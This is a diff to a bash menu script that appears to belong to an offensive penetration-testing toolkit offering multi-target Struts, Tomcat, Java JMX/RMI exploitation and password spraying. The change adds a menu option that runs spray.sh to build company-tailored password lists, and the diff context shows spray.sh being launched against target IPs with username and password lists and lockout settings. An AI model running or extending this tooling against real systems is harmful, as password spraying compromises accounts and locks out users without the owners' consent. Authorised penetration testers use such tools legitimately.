@@ -674,8 +674,8 @@ done
  echo -e "\E[1;34m::::: \e[97mExploit All The Things!! \E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
  
-PS3='Enter your choice: ENTER=Options Menu | 8=Main Menu | 9=QUIT: '
-options=("Multi-Target" "Multi-Port" "Multi-Target Struts" "Multi-Target Tomcat" "Multi-Target Java JMX" "Multi-Target Java RMI" "Password Spray" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 9=Main Menu | 10=QUIT: '
+options=("Multi-Target" "Multi-Port" "Multi-Target Struts" "Multi-Target Tomcat" "Multi-Target Java JMX" "Multi-Target Java RMI" "Password Spray" "Spray Password List Update" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -838,20 +838,14 @@ EOF
 	~/Spray/spray.sh -$userplatform $IP $usernames $userpasswords $userattempts $userlockout $userdomain $userrequestsfile | tee -a $outputfile
 	done
 		echo -e "\E[1;34m::::: \e[97mAll Output Has Been Saved In Spray_output.txt \E[1;34m:::::"
-        echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
 			;;
-#		"Password List Update")
-
-#Usage: spray.sh -passupdate <passwordList>
-#Example: spray.sh -passupdate passwords.txt
-
-#An optional company name can also be provided to add to the list
-
-
-#Useage: spray.sh -passupdate <passwordList> <CompanyName>
-#Example: spray.sh -passupdate passwords.txt Spiderlabs
-
-#			;;
+		"Spray Password List Update")
+		echo -e "\E[1;34m::::: \e[97mAn Optional Company Name Can Also Be Provided To Add To The List \E[1;34m:::::"
+		echo -e "\E[1;34m::::: \e[97mYou Can Leave This Company Option Blank If You Just Want A Generic Updated List \E[1;34m:::::"
+			read -p 'Set Password List to Update: ' userplist; read -p 'Set Company Name (Optional): ' usercompany;
+	~/Spray/spray.sh -passupdate $userplist $usercompany
+		echo -e "\E[1;34m::::: \e[97mSelected Password List Update Process Has Been Completed \E[1;34m:::::"
+			;;
 #	"Username Generation")
 
 #A username list can also be generated from a list of common names
